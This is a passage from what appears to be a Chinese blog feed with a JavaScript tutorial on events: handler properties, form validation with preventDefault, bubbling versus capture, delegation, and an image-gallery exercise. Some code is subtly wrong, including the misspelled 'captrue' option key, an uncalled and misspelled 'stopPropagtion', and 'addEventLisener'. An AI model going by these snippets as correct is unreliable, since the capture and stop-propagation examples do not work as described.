class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">sinh</span>: <span class="function"><span class="keyword">function</span> <span class="title">sinh</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">sqrt</span>: <span class="function"><span class="keyword">function</span> <span class="title">sqrt</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">tan</span>: <span class="function"><span class="keyword">function</span> <span class="title">tan</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">tanh</span>: <span class="function"><span class="keyword">function</span> <span class="title">tanh</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">trunc</span>: <span class="function"><span class="keyword">function</span> <span class="title">trunc</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">Symbol</span>(<span class="params"><span class="built_in">Symbol</span>.toStringTag</span>): &quot;<span class="title">Math</span>&quot;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure><p>Math完全就是一个工具类，没有prototype，比较常用的就是random()，数学不好，就不过多解释了</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
          <category> OOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 装饰器 </tag>
            
            <tag> 构造函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript事件</title>
      <link href="/Front-end/JavaScript/%E4%BA%8B%E4%BB%B6.html"/>
      <url>/Front-end/JavaScript/%E4%BA%8B%E4%BB%B6.html</url>
      
        <content type="html"><![CDATA[<p>所谓事件，就是当你在执行某个动作会引发其他的函数</p><span id="more"></span><p>为一个元素添加事件有很多方法，一是直接在HTML里内联（不推荐，不方便维护），二是事件处理属性，如下</p><p>1.焦点事件<code>.onfocus</code>，解除焦点状态<code>.onblur</code></p><p>2.点击事件<code>.onclick</code></p><p>3.双击时间<code>.ondbclick</code></p><p>4.按下并松开事件<code>.onkeypress</code>，按下<code>.onkeydown</code>，松开<code>onkeyup</code>，只能是window对象</p><p>5.鼠标滑入事件<code>.onmouseover</code>，鼠标移出事件<code>.onmouseout</code></p><blockquote><p><strong>注释</strong>: 将您的编程逻辑与内容分离也会使您的站点对搜索引擎更加友好。</p></blockquote><p>三是使用<code>addEventLisener(event type,linsener)</code>，第一个参数是事件类型，第二个是函数，可以使匿名函数，但注意，这种方法不兼容IE8及以下</p><h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><p>执行函数的对象，通常作为参数传递给函数</p><p>示例: 下面是有16个格子，点击会随机变换颜色</p><style>    .mydiv {        background-color: red;        height: 100px;        width: 25%;        float: left;    }</style><div class='wrapper'></div><script>    const wrapper = document.querySelector('.wrapper');      for(let i = 1; i <= 16; i++) {        const myDiv = document.createElement('div');        myDiv.setAttribute('class','mydiv')        wrapper.appendChild(myDiv);      }      function random(number) {    return Math.floor(Math.random() * number);  }  function bgChange() {    const rndCol = 'rgb(' + random(255) + ',' + random(255) + ',' + random(255) + ')';    return rndCol;  }  const divs = document.querySelectorAll('.mydiv');  for(let i = 0; i < divs.length; i++) {    divs[i].onclick = function(e) {      e.target.style.backgroundColor = bgChange();    }  }</script><figure class="highlight html"><figcaption><span>source.html &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Useful event target example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">25%</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">      &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">16</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> myDiv = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(myDiv);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">number</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * number);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">bgChange</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> rndCol = <span class="string">&#x27;rgb(&#x27;</span> + random(<span class="number">255</span>) + <span class="string">&#x27;,&#x27;</span> + random(<span class="number">255</span>) + <span class="string">&#x27;,&#x27;</span> + random(<span class="number">255</span>) + <span class="string">&#x27;)&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> rndCol;</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> divs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; divs.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">        divs[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          e.target.style.backgroundColor = bgChange();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="阻止默认行为"><a href="#阻止默认行为" class="headerlink" title="阻止默认行为"></a>阻止默认行为</h3><p>希望事件不执行它的行为，比如表单提交，当用户填写不正确时阻止他提交</p><form>      <div>        <label for="fname">First name: </label>        <input id="fname" type="text">      </div>      <div>        <label for="lname">Last name: </label>        <input id="lname" type="text">      </div>      <div>         <input id="submit" type="submit">      </div></form><p id='myp'></p><script>        var form = document.querySelector('form');        var fname = document.getElementById('fname');        var lname = document.getElementById('lname');        var submit = document.getElementById('submit');        var para = document.querySelector('#myp');        form.onsubmit = function(e) {          if (fname.value === '' || lname.value === '') {            e.preventDefault();            para.textContent = 'You need to fill in both names!';          }        }</script><figure class="highlight html"><figcaption><span>source.html &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;fname&quot;</span>&gt;</span>First name: <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lname&quot;</span>&gt;</span>Last name: <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;lname&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;myp&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> form = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fname = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;fname&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> lname = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;lname&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> submit = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;submit&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> para = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#myp&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        </span></span><br><span class="line"><span class="javascript">        form.onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (fname.value === <span class="string">&#x27;&#x27;</span> || lname.value === <span class="string">&#x27;&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">            e.preventDefault();</span></span><br><span class="line"><span class="javascript">            para.textContent = <span class="string">&#x27;You need to fill in both names!&#x27;</span>;</span></span><br><span class="line"><span class="javascript">          &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="事件冒泡与捕捉"><a href="#事件冒泡与捕捉" class="headerlink" title="事件冒泡与捕捉"></a>事件冒泡与捕捉</h3><p>在实际运用事件会碰到一个问题，父元素和子元素都有事件时如何处理</p><blockquote><p>微软的处理模型是时事件冒泡，也就是先处理子元素再处理父元素，网景（Netscape）是事件捕获，也就是先处理父元素再处理子元素</p></blockquote><p>举个例子</p><style>    .outer, .middle {    display: block;    width:   80%;    padding: 15px;    margin:  15px;    text-decoration: none;    }    .outer {    border: 1px solid red;    color:  red;    }    .middle {    border: 1px solid green;    color:  green;    width:  80%;    }</style><div class="outer">        outer-noneCaptrue        <div class="middle" target="_blank">          middle-noneCaptrue        </div></div><div class="outer">        outer-Captrue        <div class="middle" target="_blank">          middle-Captrue        </div></div><script>        const outer  = document.getElementsByClassName('outer' )[0];        const middle = document.getElementsByClassName('middle')[0];        const outer2  = document.getElementsByClassName('outer' )[1];        const middle2 = document.getElementsByClassName('middle')[1];        const captrue = {        captrue : true        };        const noneCaptrue = {        captrue : false        };        outer.addEventListener('click', onceHandler, noneCaptrue);        middle.addEventListener('click', captrueHandler, noneCaptrue);        outer2.addEventListener('click', onceHandler, captrue);        middle2.addEventListener('click', captrueHandler, captrue);        function onceHandler(event) {        alert('outer');        }        function captrueHandler(event) {        alert('middle');        }</script><figure class="highlight html"><figcaption><span>source.html &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.outer</span>, <span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>:   <span class="number">80%</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>:  <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.outer</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>:  red;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">1px</span> solid green;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>:  green;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>:  <span class="number">80%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">            outer-noneCaptrue</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">              middle-noneCaptrue</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">            outer-Captrue</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">              middle-Captrue</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> outer  = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;outer&#x27;</span> )[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> middle = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;middle&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> outer2  = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;outer&#x27;</span> )[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> middle2 = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;middle&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> captrue = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">captrue</span> : <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">            &#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> noneCaptrue = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">captrue</span> : <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">            &#125;;</span></span><br><span class="line"><span class="javascript">            outer.addEventListener(<span class="string">&#x27;click&#x27;</span>, onceHandler, noneCaptrue);</span></span><br><span class="line"><span class="javascript">            middle.addEventListener(<span class="string">&#x27;click&#x27;</span>, captrueHandler, noneCaptrue);</span></span><br><span class="line"><span class="javascript">            outer2.addEventListener(<span class="string">&#x27;click&#x27;</span>, onceHandler, captrue);</span></span><br><span class="line"><span class="javascript">            middle2.addEventListener(<span class="string">&#x27;click&#x27;</span>, captrueHandler, captrue);</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">onceHandler</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;outer&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">captrueHandler</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;middle&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>noneCaptrue也就是事件冒泡模型<ul><li>点击middle，提示middle–&gt;outer</li><li>点击outer，提示outer</li></ul></li><li>Captrue就是事件捕获模型<ul><li>点击middle，提示outer–&gt;middle</li><li>点击outer，提示outer</li></ul></li></ul><p>当然有时候并不需要触发父元素的事件，如果上面示例点击middle就只需要提示middle，改一下函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">captrueHandler</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.stopPropagtion;</span><br><span class="line">        alert(<span class="string">&#x27;middle&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h3><p>当一个父元素的子元素很多并且需要在每个子元素添加一样的事件时，只需要在它的父元素添加这个事件即可</p><p>作业</p><style>        .full-img{            position: relative;            width: 100%;        }        .overlay, .dark, .light{            position: absolute;        }        .overlay{            width: 100%;            height: 100%;            top: 0;            left: 0;        }        .dark,.light{            top: 2px;            left: 2px;            background-color: rgba(255, 255, 255, 0.6);        }        .thumb-bar img{            width: 20%;            float: left;            display: block;        }</style><h1>照片库</h1><div class="full-img">    <img class="displayed-img" src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/blog/mito3.png">    <div class="overlay"></div>    <button class="light">变暗</button></div><div class="thumb-bar"></div><script>        const thumbar = document.querySelector('.thumb-bar');        const display = document.querySelector('.displayed-img')        const overlay = document.querySelector('.overlay');        const btn = document.querySelector('.light');        for(let i=1; i<3; i++){            const myImg = document.createElement('img');            myImg.setAttribute('class','myImg');            myImg.onclick = function(e){                let src = e.target.getAttribute('src');                console.log('得到图片路径：'+src);                srcChange(src);            }            thumbar.appendChild(myImg);        }        document.querySelectorAll('.myImg')[0].setAttribute('src','https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/blog/mito3.png');        document.querySelectorAll('.myImg')[1].setAttribute('src','https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/blog/mito2.jpg');        function srcChange(src){            display.setAttribute('src',src);        }        btn.onclick = function (){            if(btn.getAttribute('class') !== 'light'){                btn.setAttribute('class','light');                overlay.style.backgroundColor = 'rgba(0,0,0,0)';            } else {                btn.setAttribute('class','dark');                overlay.style.backgroundColor = 'rgba(0,0,0,0.6)';            }        }  </script><figure class="highlight html"><figcaption><span>source.html &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span 